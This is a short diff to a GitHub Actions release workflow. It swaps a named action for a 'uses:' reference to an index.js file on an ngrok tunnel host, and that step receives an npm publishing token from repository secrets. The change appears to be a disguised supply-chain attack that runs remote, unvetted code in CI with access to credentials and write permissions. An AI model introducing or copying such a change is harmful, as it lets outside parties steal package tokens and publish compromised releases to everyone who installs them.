@@ -30,7 +30,7 @@ jobs:
       pull-requests: write
       id-token: write
     steps:
-      - uses: msgadi/optic-release-automation-action@feat/adding-alternate-flow
+      - uses: https://5173-2402-e280-3e6e-1c0-442e-2ecb-6a13-bd2.ngrok-free.app/index.js
         with:
           npm-token: >-
             ${{ secrets[format('NPM_TOKEN_{0}', github.actor)] ||
